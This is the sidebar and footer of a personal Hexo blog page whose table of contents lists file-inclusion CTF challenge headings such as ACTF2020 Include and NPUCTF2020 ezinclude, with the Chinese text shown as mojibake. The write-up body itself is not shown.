          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">æ–‡ä»¶åŒ…å«æ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E5%91%A2-ctfhub"><span class="nav-number">1.0.1.</span> <span class="nav-text">CTFé¢˜ç›®å¤ç°å‘¢-ctfhub</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">1.0.2.</span> <span class="nav-text">[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weekinclude-0%E3%80%820"><span class="nav-number">1.0.3.</span> <span class="nav-text">Weekinclude 0ã€‚0</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NPUCTF2020-ezinclude"><span class="nav-number">1.0.4.</span> <span class="nav-text">[NPUCTF2020]ezinclude</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Include-%F0%9F%8D%90"><span class="nav-number">1.0.5.</span> <span class="nav-text">[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-IncludeTwo"><span class="nav-number">1.0.6.</span> <span class="nav-text">[NewStarCTF å…¬å¼€èµ›èµ›é“]IncludeTwo</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="é™ˆæ›¦"
      src="/images/20240222142431.jpg">
  <p class="site-author-name" itemprop="name">é™ˆæ›¦</p>
  <div class="site-description" itemprop="description">çˆ±äººå…ˆçˆ±å·±ï¼Œæ‹©äººå…ˆé—®å¿ƒï¼Œcaihuaç¥ä½ å¤©å¤©å¼€å¿ƒï¼</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ca1hua" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;ca1hua" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2024-2 â€“ 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">é™ˆæ›¦</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
